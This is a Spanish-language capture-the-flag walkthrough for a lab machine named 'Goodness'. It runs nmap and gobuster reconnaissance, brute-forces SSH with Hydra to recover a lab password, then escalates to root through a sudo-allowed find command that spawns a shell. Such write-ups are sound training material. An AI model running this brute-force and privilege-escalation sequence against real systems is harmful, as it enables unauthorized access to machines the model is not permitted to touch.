---
icon: flag
---

# CTF Goodness Easy

URL Download CTF =[ ](https://drive.google.com/file/d/1Egn3NKBBF8eRtGG9xMpcb-LnzwgCb6pH/view?usp=sharing)[https://drive.google.com/file/d/1ZfCHQlCeloiXfcwoz4iXhbsv3e2mY0oM/view?usp=sharing](https://drive.google.com/file/d/1ZfCHQlCeloiXfcwoz4iXhbsv3e2mY0oM/view?usp=sharing)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-03 14:31 CEST
Nmap scan report for 192.168.5.217
Host is up (0.00047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 66:c8:a5:dd:46:68:3c:b6:2f:ee:41:54:d9:6a:f6:69 (ECDSA)
|_  256 9e:50:82:05:f9:69:51:4a:5b:11:5c:7c:34:ec:cf:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: CTF - Goodness
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 00:0C:29:63:06:E2 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
```

Veremos una pagina web normal y corriente en la que no habra mucho que hacer, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.217/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 6705]
/agora                (Status: 200) [Size: 2743]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que hemos encontrado un archivo llamado `/agora` y si entramos dentro del mismo veremos otra pagina web, si inspeccionamos el codigo veremos lo siguiente:

```
URL = http://<IP>/agora
```

```html
<!-- Mira bien la pagina  -->
```

Si miramos bien la pagina, veremos que en el `footer` pone lo siguiente:

```
Creado por: god
```

Podremos ver lo que puede ser un usuario llamado `god` por lo que vamos a realizar un poco de `fuerza bruta` con dicho usuario de la siguiente forma.

## Escalate user god

### Hydra

```shell
hydra -l god -P <WORDLIST> ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-03 15:27:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.5.217:22/
[22][ssh] host: 192.168.5.217   login: god   password: love
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 17 final worker threads did not complete until end.
[ERROR] 17 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-03 15:27:54
```

Veremos que hemos encontrado las credenciales de dicho usuario, por lo que nos vamos a conectar por `SSH`.

```shell
ssh god@<IP>
```

Metemos como contraseña `love` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario `god`.

> user.txt

```
FLAG{user_goodness_flag}
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for god on goodness:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User god may run the following commands on goodness:
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: /usr/bin/find
```

Veremos que podemos ejecutar `find` como el usuario `root`, pero tambien tendremos directamente todos los privilegios de `root`, aunque si lo hacemos por el binario `find` seria de la siguiente forma:

```shell
sudo find . -exec /bin/bash \; -quit
```

Info:

```
root@goodness:/home/god# whoami
root
```

Veremos que seremos `root`, por lo que leeremos la `flag` del usuario `root`.

> root.txt

```
FLAG{goodness_flag}
```
